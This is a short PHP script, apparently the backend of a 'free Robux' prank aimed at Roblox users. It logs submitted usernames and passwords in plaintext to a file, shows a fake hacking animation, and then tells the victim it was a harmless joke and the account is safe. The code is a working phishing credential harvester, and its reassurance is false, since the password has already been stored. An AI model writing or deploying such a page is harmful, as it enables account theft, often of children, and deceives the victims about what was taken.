<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $password = $_POST['password'];

    // Guardar datos en archivo
    $archivo = fopen("datos.txt", "a");
    fwrite($archivo, "Usuario: " . $usuario . "\n");
    fwrite($archivo, "Contraseña: " . $password . "\n");
    fwrite($archivo, "-----------------------------\n");
    fclose($archivo);

    // Página de "hackeo falso"
    echo '<!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Hackeando...</title>
        <style>
            body {
                background-color: black;
                color: lime;
                font-family: monospace;
                text-align: center;
                padding-top: 100px;
            }
            #mensaje {
                font-size: 30px;
                white-space: pre-line;
            }
        </style>
    </head>
    <body>
        <h1 id="mensaje"></h1>

        <script>
            const texto = "CONFIRMANDO ENVÍO DE ROBUX...\\n\\nERROR: Fallo en la transacción.\\n\\nINICIANDO HACK...\\nInstalando virus troyano...\\nRobando Robux...\\nBorrando cuenta de Roblox...\\n¡MUHAHAHAHA!";
            let i = 0;
            function escribir() {
                if (i < texto.length) {
                    document.getElementById("mensaje").innerHTML += texto.charAt(i);
                    i++;
                    setTimeout(escribir, 50); // velocidad de escritura
                }
            }
            escribir();

            // Después de 8 segundos, muestra el mensaje de "Era una broma"
            setTimeout(function() {
                document.body.innerHTML = "<h1>¡Era una broma! 😜</h1><p>No te preocupes, tu cuenta está a salvo. ¡Solo era una broma de tu hermano!</p>";
            }, 8000); // Cambia de pantalla después de 8 segundos
        </script>
    </body>
    </html>';
}
?>
